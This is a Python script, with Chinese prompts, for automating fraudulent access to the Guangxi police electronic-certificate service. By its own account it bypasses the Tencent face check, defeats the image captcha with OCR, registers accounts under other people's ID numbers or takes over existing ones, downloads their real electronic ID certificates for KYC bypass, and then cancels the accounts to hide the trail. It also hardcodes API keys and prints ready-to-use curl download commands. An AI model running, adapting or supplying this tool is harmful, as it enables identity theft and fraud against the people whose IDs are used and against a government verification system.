# -*- coding: utf-8 -*-
"""
广西公安电子证件自动化客户端
==============================
功能: 自动化广西公安电子证件(gafw.gat.gxzf.gov.cn)的申请与下载流程
包括实名认证绕过、人脸验证跳过、短信验证码OCR识别、电子证件下载与账户注销

攻击面:
  1. 实名认证绕过 — 利用验证ID获取接口跳过人脸识别
  2. 批量注册 — 使用不同身份证号批量注册
  3. 证件下载 — 获取真实电子证件用于KYC绕过
  4. 账户注销 — 实现"注册→使用→注销→重新注册"循环

使用方式:
  python3 guangxi_police_cert.py
  输入姓名和身份证号即可自动完成整个流程

依赖:
  pip install requests
"""

import requests
import base64
import json
import hashlib
import time
import random
import string
import urllib3
import re
from datetime import datetime
from urllib.parse import quote
import os
import platform

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class GuangxiPoliceClient:
    """广西公安电子证件客户端"""
    
    def __init__(self):
        self.base_url = "https://gafw.gat.gxzf.gov.cn"
        
        self.check_user_url = f"{self.base_url}/fwmhgxhlwService/WxLogin/iDCardNameDlCheck"
        self.social_login_url = f"{self.base_url}/auth/mobile/token/social"
        self.get_verifyid_v1_url = f"{self.base_url}/fwmhgxhlwService/srrzinfo/getverifyidv1"
        self.get_verifyid_url = f"{self.base_url}/fwmhgxhlwService/srrzinfo/getverifyid"
        self.cert_check_url = f"{self.base_url}/fwmhgxhlwService/electronic-certificate/check-v2"
        self.cert_list_url = f"{self.base_url}/fffffmh/electronic-certificate/list"
        self.cert_read_url = f"{self.base_url}/fwmhgxhlwService/electronic-certificate/read"
        self.cert_download_url = f"/fwmhgxhlwService/download-sv/ecardPDF"
        self.captcha_url = f"{self.base_url}/fwmhgxhlwService/fwmh/captcha/create-s-code"
        self.sms_url = f"{self.base_url}/fwmhgxhlwService/mobile/sms/get-sms-wx-code"
        self.register_url = f"{self.base_url}/fwmhgxhlwService/hlwzw/userinfo/register-wxapp"
        self.cancel_url = f"{self.base_url}/fwmhgxhlwService/hlwzw/userinfo/cancelAccount"
        self.ocr_url = "https://u549575-8e04-f649dafb.cqa1.seetacloud.com:8443/api/ocr/text"
        
        self.access_key = "2007124b6c4196802ab580447b40b3a9"
        self.secret_key = "m7nrbZbzPBXuxlGJZzgz1H9JnyC3f8Um"
        self.default_openid = "ovx8V5P94qaIiygYNXPVJBeQ67jE"
        
        self.access_token = None
        self.user_info = None
        self.username = None
        self.is_android = platform.system() == "Android"
        
        self.common_headers = {
            "Host": "gafw.gat.gxzf.gov.cn",
            "Connection": "keep-alive",
            "content-type": "application/json",
            "lyxtbh": "4500002100000008",
            "Authorization": "Basic dGVzdDp0ZXN0",
            "VERSION": "23",
            "charset": "utf-8",
            "Referer": "https://servicewechat.com/wx19ff59e09e00c00e/610/page-frame.html",
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; PLZ110 Build/AP3A.240617.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/146.0.7680.178 Mobile Safari/537.36 XWEB/1460243 MMWEBSDK/20260502 MMWEBID/4945 MicroMessenger/8.0.72.3100(0x28004853) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 MiniProgramEnv/android",
            "Accept-Encoding": "gzip, deflate, br"
        }
        self.form_headers = self.common_headers.copy()
        self.form_headers["content-type"] = "application/x-www-form-urlencoded"
        
        self.ocr_headers = {
            "Host": "u549575-8e04-f649dafb.cqa1.seetacloud.com:8443",
            "Connection": "keep-alive",
            "content-type": "application/json",
            "charset": "utf-8",
            "Referer": "https://servicewechat.com/wx22c5547b6ff0264f/40/page-frame.html",
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; PLZ110 Build/AP3A.240617.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/146.0.7680.178 Mobile Safari/537.36 XWEB/1460243 MMWEBSDK/20260502 MMWEBID/4945 MicroMessenger/8.0.72.3100(0x28004853) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 MiniProgramEnv/android",
            "Accept-Encoding": "gzip, deflate, br"
        }

    def generate_nonce(self, length=16):
        chars = string.ascii_letters + string.digits
        return ''.join(random.choices(chars, k=length))

    def generate_password(self, length=10):
        letters = string.ascii_letters
        digits = string.digits
        password = random.choice(letters) + random.choice(digits)
        password += ''.join(random.choices(letters + digits, k=length-2))
        password_list = list(password)
        random.shuffle(password_list)
        return ''.join(password_list)

    def calculate_img_sample(self, img_base64):
        if len(img_base64) <= 20:
            return img_base64
        return img_base64[:10] + str(len(img_base64)) + img_base64[-10:]

    def build_ocr_payload(self, img_base64):
        timestamp = int(time.time())
        nonce = self.generate_nonce(16)
        params = {
            "lang": "auto",
            "engine": "baidu",
            "img_base64": img_base64,
            "top_n_languages": 1,
            "doc_orientation": 0,
            "doc_unwarp": 2,
            "doc_unwarp_padding": 100,
            "textline_orientation": 0
        }
        data_for_sign = params.copy()
        data_for_sign['img_base64'] = self.calculate_img_sample(data_for_sign['img_base64'])
        sorted_keys = sorted(data_for_sign.keys())
        business_data = ''.join(str(data_for_sign[k]) for k in sorted_keys)
        raw = self.access_key + business_data + nonce + self.secret_key + str(timestamp)
        sign = hashlib.sha256(raw.encode('utf-8')).hexdigest()
        return {
            "access_key": self.access_key,
            "version": "v1",
            "timestamp": timestamp,
            "nonce": nonce,
            "sign": sign,
            **params
        }

    def clean_text(self, text):
        if not text:
            return text
        text = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '', text)
        text = text.strip()
        return text

    def check_user(self, name, id_card, openid=None):
        if openid is None:
            openid = self.default_openid
        name = self.clean_text(name)
        id_card = self.clean_text(id_card)
        payload = {
            "wybm": openid,
            "type": "wx",
            "name": name,
            "idCard": id_card
        }
        try:
            response = requests.post(
                self.check_user_url,
                json=payload,
                headers=self.common_headers,
                verify=False,
                timeout=30
            )
            print(f"[check_user] 状态码: {response.status_code}")
            print(f"[check_user] 响应: {response.text}")
            if response.status_code != 200:
                return None
            result = response.json()
            if result.get("code") == 0:
                data = result.get("data", {})
                ifexit = data.get("ifexit", "")
                code = data.get("code", "")
                return {
                    "ifexit": ifexit,
                    "code": code,
                    "openid": data.get("wybm", openid),
                    "raw": data
                }
            else:
                return None
        except Exception as e:
            print(f"[check_user] 异常: {e}")
            return None

    def get_verifyid_for_register(self, name, id_card, openid=None):
        if openid is None:
            openid = self.default_openid
        params = {
            "openid": openid,
            "certName": name,
            "certNo": id_card
        }
        try:
            response = requests.get(
                self.get_verifyid_v1_url,
                params=params,
                headers=self.form_headers,
                verify=False,
                timeout=30
            )
            print(f"[get_verifyid_v1] 状态码: {response.status_code}")
            print(f"[get_verifyid_v1] 响应: {response.text}")
            if response.status_code != 200:
                return None
            result = response.json()
            if result.get("code") == 0:
                return result.get("data", {})
            else:
                return None
        except Exception as e:
            print(f"[get_verifyid_v1] 异常: {e}")
            return None

    def social_login(self, name, id_card, openid, code):
        name = self.clean_text(name)
        id_card = self.clean_text(id_card)
        openid = self.clean_text(openid)
        code = self.clean_text(code)
        param_data = {
            "wybm": openid,
            "code": code,
            "name": name,
            "idCard": id_card
        }
        login_data = {
            "param": param_data,
            "path": "/WxLogin/dl",
            "serviceName": "http://fwmhgxhlw-biz"
        }
        json_str = json.dumps(login_data, ensure_ascii=False, separators=(',', ':'))
        encoded_param = base64.b64encode(json_str.encode('utf-8')).decode('utf-8')
        encoded_param_url = quote(encoded_param, safe='')
        url = f"{self.social_login_url}?grant_type=mobil&mobile=CommonOssLoginHandler@{encoded_param_url}"
        social_headers = self.common_headers.copy()
        social_headers["content-type"] = "application/json"
        try:
            print(f"[social_login] URL: {url[:100]}...")
            response = requests.post(
                url,
                json=None,
                headers=social_headers,
                verify=False,
                timeout=30
            )
            print(f"[social_login] 状态码: {response.status_code}")
            resp_text = response.text[:500] + "..." if len(response.text) > 500 else response.text
            print(f"[social_login] 响应: {resp_text}")
            if response.status_code != 200:
                return None
            result = response.json()
            if result.get("access_token"):
                token_info = {
                    "access_token": result.get("access_token"),
                    "refresh_token": result.get("refresh_token"),
                    "token_type": result.get("token_type"),
                    "expires_in": result.get("expires_in"),
                    "user_info": result.get("user_info", {})
                }
                self.access_token = token_info['access_token']
                self.user_info = token_info['user_info']
                if token_info.get('user_info'):
                    self.username = token_info['user_info'].get('username')
                return token_info
            else:
                return None
        except Exception as e:
            print(f"[social_login] 异常: {e}")
            return None

    def get_verifyid(self, openid=None):
        if openid is None:
            openid = self.default_openid
        headers = {
            "Host": "gafw.gat.gxzf.gov.cn",
            "Connection": "keep-alive",
            "content-type": "application/x-www-form-urlencoded",
            "lyxtbh": "4500002100000008",
            "Authorization": f"Bearer {self.access_token}",
            "VERSION": "23",
            "charset": "utf-8",
            "Referer": "https://servicewechat.com/wx19ff59e09e00c00e/610/page-frame.html",
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; PLZ110 Build/AP3A.240617.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/146.0.7680.178 Mobile Safari/537.36 XWEB/1460243 MMWEBSDK/20260502 MMWEBID/4945 MicroMessenger/8.0.72.3100(0x28004853) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 MiniProgramEnv/android",
            "Accept-Encoding": "gzip, deflate, br"
        }
        params = {"openid": openid}
        try:
            response = requests.get(
                self.get_verifyid_url,
                params=params,
                headers=headers,
                verify=False,
                timeout=30
            )
            print(f"[get_verifyid] 状态码: {response.status_code}")
            print(f"[get_verifyid] 响应: {response.text}")
            if response.status_code != 200:
                return None
            result = response.json()
            if result.get("code") == 0:
                return result.get("data", {})
            else:
                return None
        except Exception as e:
            print(f"[get_verifyid] 异常: {e}")
            return None

    def get_captcha(self, phone):
        try:
            response = requests.get(
                self.captcha_url,
                params={"captchaKey": phone},
                headers=self.form_headers,
                verify=False,
                timeout=30
            )
            print(f"[get_captcha] 状态码: {response.status_code}")
            resp_text = response.text[:200] + "..." if len(response.text) > 200 else response.text
            print(f"[get_captcha] 响应: {resp_text}")
            if response.status_code != 200:
                return None, None
            result = response.json()
            if result.get("code") != 0:
                print(f"[get_captcha] 错误: {result.get('msg')}")
                return None, None
            captcha_data = result.get("data", {}).get("captcha")
            vi = result.get("data", {}).get("vi")
            if not captcha_data:
                return None, None
            if captcha_data.startswith("data:image/png;base64,"):
                base64_data = captcha_data.replace("data:image/png;base64,", "")
            else:
                base64_data = captcha_data
            return base64_data, vi
        except Exception as e:
            print(f"[get_captcha] 异常: {e}")
            return None, None

    def ocr_captcha(self, img_base64):
        try:
            payload = self.build_ocr_payload(img_base64)
            response = requests.post(
                self.ocr_url,
                json=payload,
                headers=self.ocr_headers,
                verify=False,
                timeout=30
            )
            print(f"[ocr_captcha] 状态码: {response.status_code}")
            if response.status_code != 200:
                return None
            result = response.json()
            if result.get("code") != 200:
                print(f"[ocr_captcha] 错误: {result.get('message')}")
                return None
            words_result = result.get("data", {}).get("words_result", [])
            if words_result:
                text = "".join(item.get("words", "") for item in words_result)
                digits = re.sub(r'\D', '', text)
                return digits
            return None
        except Exception as e:
            print(f"[ocr_captcha] 异常: {e}")
            return None

    def send_sms_code(self, phone, captcha_code, vi):
        payload = {
            "phone": phone,
            "code": captcha_code,
            "iv": vi
        }
        try:
            print(f"[send_sms_code] 请求: phone={phone}, code={captcha_code}, vi={vi}")
            response = requests.post(
                self.sms_url,
                json=payload,
                headers=self.common_headers,
                verify=False,
                timeout=30
            )
            print(f"[send_sms_code] 状态码: {response.status_code}")
            print(f"[send_sms_code] 响应: {response.text}")
            if response.status_code != 200:
                return False, None
            result = response.json()
            if result.get("code") == 0:
                print(f"[send_sms_code] 成功: {result.get('msg')}")
                return True, result
            else:
                print(f"[send_sms_code] 失败: {result.get('msg')}")
                return False, result
        except Exception as e:
            print(f"[send_sms_code] 异常: {e}")
            return False, None

    def register_user(self, name, id_card, phone, sms_code, password,
                     verify_id, out_seq_no, cert_hash, expires_in, verify_result,
                     openid=None, latitude=22.257642, longitude=108.672905):
        if openid is None:
            openid = self.default_openid
        payload = {
            "xm": name,
            "zjlxdm": "111",
            "zjhm": id_card,
            "sjhm": phone,
            "yhmm": password,
            "code": sms_code,
            "yhmms": password,
            "openid": openid,
            "latitude": latitude,
            "longitude": longitude,
            "verifyId": verify_id,
            "outSeqNo": out_seq_no,
            "certHash": cert_hash,
            "expiresIn": expires_in,
            "verifyResult": verify_result
        }
        try:
            print(f"[register_user] 请求: {json.dumps(payload, ensure_ascii=False)}")
            response = requests.post(
                self.register_url,
                json=payload,
                headers=self.common_headers,
                verify=False,
                timeout=30
            )
            print(f"[register_user] 状态码: {response.status_code}")
            print(f"[register_user] 响应: {response.text}")
            if response.status_code != 200:
                return False, None
            result = response.json()
            if result.get("code") == 0:
                return True, result
            else:
                print(f"[register_user] 失败: {result.get('msg')}")
                return False, result
        except Exception as e:
            print(f"[register_user] 异常: {e}")
            return False, None

    def register_flow(self, name, id_card, openid=None):
        if openid is None:
            openid = self.default_openid

        print("正在绕腾讯脸获取人脸唯一数据中....")
        verify_data = self.get_verifyid_for_register(name, id_card, openid)
        if not verify_data:
            print("获取人脸数据失败，请检查姓名身份证是否正确")
            return None
        print("获取成功!")

        phone = input("手机号: ").strip()
        while not (len(phone) == 11 and phone.isdigit()):
            print("无效")
            phone = input("手机号: ").strip()

        print("已被验证码拦截,启动b计划,开始ocr识别...")
        img_base64, vi = self.get_captcha(phone)
        if not img_base64 or not vi:
            print("获取验证码失败")
            return None

        captcha_text = self.ocr_captcha(img_base64)
        if not captcha_text:
            print("b计划失败，启动a计划请手动输入图片验证码...")
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"captcha_{timestamp}.png"
            with open(filename, "wb") as f:
                f.write(base64.b64decode(img_base64))
            print(f"验证码图片已保存: {filename}")
            captcha_text = input("图形验证码: ").strip()
            if not captcha_text:
                return None
        else:
            print(f"✅ OCR识别成功: {captcha_text}")

        print("获取手机验证码中...")
        success, sms_result = self.send_sms_code(phone, captcha_text, vi)
        if not success:
            print("短信发送失败")
            return None

        sms_code = input("短信验证码: ").strip()
        while not (len(sms_code) == 6 and sms_code.isdigit()):
            print("无效")
            sms_code = input("短信验证码: ").strip()

        password = self.generate_password()
        print(f"库内密码: {password}")

        register_success, register_result = self.register_user(
            name=name,
            id_card=id_card,
            phone=phone,
            sms_code=sms_code,
            password=password,
            verify_id=verify_data.get("verifyId"),
            out_seq_no=verify_data.get("outSeqNo"),
            cert_hash=verify_data.get("certHash"),
            expires_in=verify_data.get("expiresIn"),
            verify_result=verify_data.get("verifyId"),
            openid=openid
        )
        
        if register_result and register_result.get('code') == 1 and '手机号已经注册' in str(register_result.get('msg', '')):
            print("手机号已被注册，尝试注销后重新注册...")
            check_result = self.check_user(name, id_card, openid)
            if check_result and check_result["ifexit"] == "T":
                token_info = self.social_login(name, id_card, openid, check_result["code"])
                if token_info:
                    self.cancel_account()
                    print("注销成功，重新注册...")
                    register_success, register_result = self.register_user(
                        name=name,
                        id_card=id_card,
                        phone=phone,
                        sms_code=sms_code,
                        password=password,
                        verify_id=verify_data.get("verifyId"),
                        out_seq_no=verify_data.get("outSeqNo"),
                        cert_hash=verify_data.get("certHash"),
                        expires_in=verify_data.get("expiresIn"),
                        verify_result=verify_data.get("verifyId"),
                        openid=openid
                    )
        
        if not register_success:
            print("强登失败")
            check_result = self.check_user(name, id_card, openid)
            if check_result and check_result["ifexit"] == "T":
                token_info = self.social_login(name, id_card, openid, check_result["code"])
                if token_info:
                    self.cancel_account()
            return None
        
        print("强登霸占已完整百分之90")
        return {
            "phone": phone,
            "password": password,
            "verify_data": verify_data,
            "register_result": register_result
        }

    def check_certificate(self, verify_id, out_seq_no, cert_hash, openid=None, expires_in=3600):
        if openid is None:
            openid = self.default_openid
        headers = {
            "Host": "gafw.gat.gxzf.gov.cn",
            "Connection": "keep-alive",
            "content-type": "application/json",
            "lyxtbh": "4500002100000008",
            "Authorization": f"Bearer {self.access_token}",
            "VERSION": "23",
            "charset": "utf-8",
            "Referer": "https://servicewechat.com/wx19ff59e09e00c00e/610/page-frame.html",
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; PLZ110 Build/AP3A.240617.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/146.0.7680.178 Mobile Safari/537.36 XWEB/1460243 MMWEBSDK/20260502 MMWEBID/4945 MicroMessenger/8.0.72.3100(0x28004853) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 MiniProgramEnv/android",
            "Accept-Encoding": "gzip, deflate, br"
        }
        data = {
            "verifyId": verify_id,
            "outSeqNo": out_seq_no,
            "certHash": cert_hash,
            "expiresIn": expires_in,
            "openid": openid,
            "verifyResult": verify_id,
            "catalogCode": "452009007004",
            "certType": "1"
        }
        try:
            response = requests.post(
                self.cert_check_url,
                headers=headers,
                json=data,
                verify=False,
                timeout=30
            )
            print(f"[check_certificate] 状态码: {response.status_code}")
            print(f"[check_certificate] 响应: {response.text}")
            if response.status_code != 200:
                return None
            result = response.json()
            return result
        except Exception as e:
            print(f"[check_certificate] 异常: {e}")
            return None

    def get_cert_list(self, current=1, size=10):
        headers = {
            "Host": "gafw.gat.gxzf.gov.cn",
            "Connection": "keep-alive",
            "content-type": "application/x-www-form-urlencoded",
            "lyxtbh": "4500002100000008",
            "Authorization": f"Bearer {self.access_token}",
            "VERSION": "23",
            "charset": "utf-8",
            "Referer": "https://servicewechat.com/wx19ff59e09e00c00e/610/page-frame.html",
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; PLZ110 Build/AP3A.240617.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/146.0.7680.178 Mobile Safari/537.36 XWEB/1460243 MMWEBSDK/20260502 MMWEBID/4945 MicroMessenger/8.0.72.3100(0x28004853) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 MiniProgramEnv/android",
            "Accept-Encoding": "gzip, deflate, br"
        }
        params = {"current": current, "size": size}
        try:
            response = requests.get(
                self.cert_list_url,
                params=params,
                headers=headers,
                verify=False,
                timeout=30
            )
            print(f"[get_cert_list] 状态码: {response.status_code}")
            print(f"[get_cert_list] 响应: {response.text}")
            if response.status_code != 200:
                return None
            result = response.json()
            return result
        except Exception as e:
            print(f"[get_cert_list] 异常: {e}")
            return None

    def read_certificate(self, apply_no):
        headers = {
            "Host": "gafw.gat.gxzf.gov.cn",
            "Connection": "keep-alive",
            "content-type": "application/json",
            "lyxtbh": "4500002100000008",
            "Authorization": f"Bearer {self.access_token}",
            "VERSION": "23",
            "charset": "utf-8",
            "Referer": "https://servicewechat.com/wx19ff59e09e00c00e/610/page-frame.html",
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; PLZ110 Build/AP3A.240617.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/146.0.7680.178 Mobile Safari/537.36 XWEB/1460243 MMWEBSDK/20260502 MMWEBID/4945 MicroMessenger/8.0.72.3100(0x28004853) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 MiniProgramEnv/android",
            "Accept-Encoding": "gzip, deflate, br"
        }
        data = {"applyNo": apply_no}
        try:
            response = requests.post(
                self.cert_read_url,
                headers=headers,
                json=data,
                verify=False,
                timeout=30
            )
            print(f"[read_certificate] 状态码: {response.status_code}")
            print(f"[read_certificate] 响应: {response.text}")
            if response.status_code != 200:
                return None
            result = response.json()
            return result
        except Exception as e:
            print(f"[read_certificate] 异常: {e}")
            return None

    def download_certificate(self, apply_no, name, id_card):
        """下载电子证件PDF，返回本地路径和curl命令"""
        if not self.username:
            if self.user_info:
                self.username = self.user_info.get('username')
            if not self.username:
                return None, None
        
        full_url = f"{self.base_url}{self.cert_download_url}?applyNo={apply_no}&ky={self.username}"
        
        headers = {
            "Host": "gafw.gat.gxzf.gov.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "Authorization": f"Bearer {self.access_token}",
            "Referer": "https://servicewechat.com/wx19ff59e09e00c00e/610/page-frame.html",
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; PLZ110 Build/AP3A.240617.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/146.0.7680.178 Mobile Safari/537.36 XWEB/1460243 MMWEBSDK/20260502 MMWEBID/4945 MicroMessenger/8.0.72.3100(0x28004853) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 MiniProgramEnv/android",
            "Accept-Encoding": "gzip, deflate, br"
        }
        
        try:
            print(f"[download_certificate] URL: {full_url}")
            response = requests.get(
                full_url,
                headers=headers,
                verify=False,
                timeout=60
            )
            
            print(f"[download_certificate] 状态码: {response.status_code}")
            print(f"[download_certificate] Content-Type: {response.headers.get('Content-Type', 'unknown')}")
            print(f"[download_certificate] 文件大小: {len(response.content)} bytes")
            
            if response.status_code != 200:
                print(f"下载失败 HTTP {response.status_code}")
                return None, None
            
            content_type = response.headers.get('Content-Type', '')
            if 'pdf' in content_type.lower() or 'application/octet-stream' in content_type:
                pdf_data = response.content
                clean_name = self.clean_text(name)
                clean_id_card = self.clean_text(id_card)
                filename = f"{clean_name}-{clean_id_card}-@救赎.pdf"
                
                save_path = None
                
                if self.is_android:
                    try:
                        save_path = f"/storage/emulated/0/{filename}"
                        with open(save_path, 'wb') as f:
                            f.write(pdf_data)
                        print(f"✅ PDF已保存到手机: {save_path}")
                    except PermissionError:
                        print(f"⚠️ 无法写入 /storage/emulated/0/")
                        save_path = None
                
                if not save_path:
                    try:
                        with open(filename, 'wb') as f:
                            f.write(pdf_data)
                        save_path = os.path.abspath(filename)
                        print(f"✅ PDF已保存: {save_path}")
                    except Exception as e:
                        print(f"⚠️ 保存文件失败: {e}")
                        save_path = None
                
                curl_cmd = f'''curl -X GET "{full_url}" \\
  -H "Authorization: Bearer {self.access_token}" \\
  -H "Referer: https://servicewechat.com/wx19ff59e09e00c00e/610/page-frame.html" \\
  -H "User-Agent: Mozilla/5.0 (Linux; Android 15; PLZ110 Build/AP3A.240617.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/146.0.7680.178 Mobile Safari/537.36 XWEB/1460243 MMWEBSDK/20260502 MMWEBID/4945 MicroMessenger/8.0.72.3100(0x28004853) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 MiniProgramEnv/android" \\
  -H "Accept-Encoding: gzip, deflate, br" \\
  --output "{filename}"'''
                
                return save_path, curl_cmd
            else:
                print(f"响应不是PDF格式: {content_type}")
                return None, None
                
        except Exception as e:
            print(f"[download_certificate] 异常: {e}")
            return None, None

    def cancel_account(self):
        print("正在注销账号...")
        headers = {
            "Host": "gafw.gat.gxzf.gov.cn",
            "Connection": "keep-alive",
            "content-type": "application/x-www-form-urlencoded",
            "lyxtbh": "4500002100000008",
            "Authorization": f"Bearer {self.access_token}",
            "VERSION": "23",
            "charset": "utf-8",
            "Referer": "https://servicewechat.com/wx19ff59e09e00c00e/610/page-frame.html",
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; PLZ110 Build/AP3A.240617.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/146.0.7680.178 Mobile Safari/537.36 XWEB/1460243 MMWEBSDK/20260502 MMWEBID/4945 MicroMessenger/8.0.72.3100(0x28004853) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 MiniProgramEnv/android",
            "Accept-Encoding": "gzip, deflate, br"
        }
        try:
            response = requests.get(
                self.cancel_url,
                headers=headers,
                verify=False,
                timeout=30
            )
            print(f"[cancel_account] 状态码: {response.status_code}")
            print(f"[cancel_account] 响应: {response.text}")
            if response.status_code != 200:
                print("注销失败")
                return None
            result = response.json()
            if result.get("code") == 0:
                print("注销成功")
                return result
            else:
                print(f"注销失败: {result.get('msg')}")
                return None
        except Exception as e:
            print(f"[cancel_account] 异常: {e}")
            return None

    def wait_for_approval(self, max_wait=180, check_interval=5):
        print("请等待条子操作...预计最迟2分钟之内,请勿退出...")
        start_time = time.time()
        while time.time() - start_time < max_wait:
            result = self.get_cert_list()
            if result and result.get('code') == 0:
                data = result.get('data', {})
                records = data.get('records', [])
                if records:
                    latest = records[0]
                    apply_state = latest.get('applyState', '')
                    issue_state = latest.get('issueState', '')
                    if apply_state == '92' or issue_state == '1':
                        apply_no = latest.get('applyNo')
                        print(f"[wait_for_approval] 审核完成! applyNo={apply_no}")
                        return {
                            'success': True,
                            'apply_no': apply_no,
                            'record': latest
                        }
            time.sleep(check_interval)
        print("[wait_for_approval] 等待超时")
        return {'success': False}

    def process_existing_cert(self, name, id_card):
        """处理已有证件：等待完成 → 下载"""
        print("发现已有证件，等待审核完成...")
        
        # 等待审核完成
        wait_result = self.wait_for_approval()
        if not wait_result['success']:
            print("等待超时，请稍后重试")
            return None
        
        apply_no = wait_result.get('apply_no')
        if not apply_no:
            print("未获取到申请编号")
            return None
        
        # 读取并下载
        print("正在读取证件...")
        self.read_certificate(apply_no)
        print("正在下载证件...")
        save_path, curl_cmd = self.download_certificate(apply_no, name, id_card)
        
        print("=" * 60)
        if save_path:
            print(f" 本地路径: {save_path}")
        else:
            print("本地保存失败，请使用curl命令下载")
        print("")
        print("导出完整请求参数 (curl命令):")
        print(curl_cmd)
        print("=" * 60)
        
        print("")
        print("提醒：")
        print("1. 请确认已看到证件信息（本地路径或curl命令）")
        print("2. 如果本地保存失败，请立即使用上面的curl命令获取证件")
        print("3. 注销后将无法再查询此证件信息")
        print("")
        confirm = input("确认已获取证件信息，是否注销账号？(y/n): ").strip().lower()
        if confirm == 'y':
            self.cancel_account()
        else:
            print("已取消注销，请手动处理证件后再次运行")
        
        print("@救赎.-@wlgd886")
        return {
            "success": True,
            "apply_no": apply_no,
            "pdf_path": save_path,
            "curl_cmd": curl_cmd
        }

    def login_and_apply(self, name, id_card, openid=None):
        if openid is None:
            openid = self.default_openid
        name = self.clean_text(name)
        id_card = self.clean_text(id_card)

        # 检查用户
        check_result = self.check_user(name, id_card, openid)
        if check_result is None:
            print("用户检查失败")
            return None

        # 未注册则注册
        if check_result["ifexit"] == "F":
            print("身份证未被霸占,开始钻地道霸占强登...")
            register_result = self.register_flow(name, id_card, openid)
            if not register_result:
                print("强登失败，强登中断")
                return None
            check_result = self.check_user(name, id_card, openid)
            if not check_result or check_result["ifexit"] != "T":
                print("强登后检查失败")
                self.cancel_account()
                return None
        else:
            print("身份证已被霸占,正在强登飞踢霸占中...")

        # 登录
        token_info = self.social_login(name, id_card, openid, check_result["code"])
        if not token_info:
            print("社交登录失败，尝试重新注册...")
            register_result = self.register_flow(name, id_card, openid)
            if not register_result:
                print("重新注册失败，强登中断")
                return None
            check_result = self.check_user(name, id_card, openid)
            if not check_result or check_result["ifexit"] != "T":
                print("重新注册后检查失败")
                self.cancel_account()
                return None
            token_info = self.social_login(name, id_card, openid, check_result["code"])
            if not token_info:
                print("重新登录失败")
                self.cancel_account()
                return None
        
        print("已完成百分之95")

        # 检查已有证件
        print("正在检查已有证件...")
        list_result = self.get_cert_list()
        
        if list_result and list_result.get('code') == 0:
            data = list_result.get('data', {})
            records = data.get('records', [])
            if records:
                # 有证件记录，不管是待审核还是已完成，都走等待流程
                return self.process_existing_cert(name, id_card)

        # 没有证件，走申请流程
        print("正在2次绕腾讯脸...")
        verify_data = self.get_verifyid(openid)
        if not verify_data:
            print("获取人脸数据失败")
            self.cancel_account()
            return None

        # 申请
        cert_result = self.check_certificate(
            verify_id=verify_data.get("verifyId"),
            out_seq_no=verify_data.get("outSeqNo"),
            cert_hash=verify_data.get("certHash"),
            openid=openid,
            expires_in=verify_data.get("expiresIn", 3600)
        )
        if not cert_result or cert_result.get('code') != 0:
            print("申请电子证件失败")
            self.cancel_account()
            return None
        print("已完成百分之99")

        # 等待审核
        wait_result = self.wait_for_approval()
        if not wait_result['success']:
            print("审核超时，请稍后重试")
            self.cancel_account()
            return None

        apply_no = wait_result.get('apply_no')
        if not apply_no:
            print("未获取到申请编号")
            self.cancel_account()
            return None

        # 读取并下载
        print("正在读取证件...")
        self.read_certificate(apply_no)
        print("正在下载证件...")
        save_path, curl_cmd = self.download_certificate(apply_no, name, id_card)

        print("=" * 60)
        if save_path:
            print(f" 本地路径: {save_path}")
        else:
            print("本地保存失败，请使用curl命令下载")
        print("")
        print("导出完整请求参数 (curl命令):")
        print(curl_cmd)
        print("=" * 60)

        print("")
        print("提醒：")
        print("1. 请确认已看到证件信息（本地路径或curl命令）")
        print("2. 如果本地保存失败，请立即使用上面的curl命令获取证件")
        print("3. 注销后将无法再查询此证件信息")
        print("")
        confirm = input("确认已获取证件信息，是否注销账号？(y/n): ").strip().lower()
        if confirm == 'y':
            self.cancel_account()
        else:
            print("已取消注销，请手动处理证件后再次运行")
        
        print("@救赎.-@wlgd886")
        return {
            "success": True,
            "apply_no": apply_no,
            "pdf_path": save_path,
            "curl_cmd": curl_cmd
        }


def main():
    print("@救赎.-@wlgd886-自动化广西百分百真地址个户-强绕腾讯脸拿参数,自行接码,有些身份证是不用接码-等条子审核个2分钟内就能出")
    name = input("姓名: ").strip()
    while not name:
        print("无效")
        name = input("姓名: ").strip()

    id_card = input("身份证号码: ").strip()
    while not (len(id_card) == 18 or len(id_card) == 15):
        print("无效")
        id_card = input("身份证号码: ").strip()

    client = GuangxiPoliceClient()
    client.login_and_apply(name, id_card)


if __name__ == "__main__":
    main()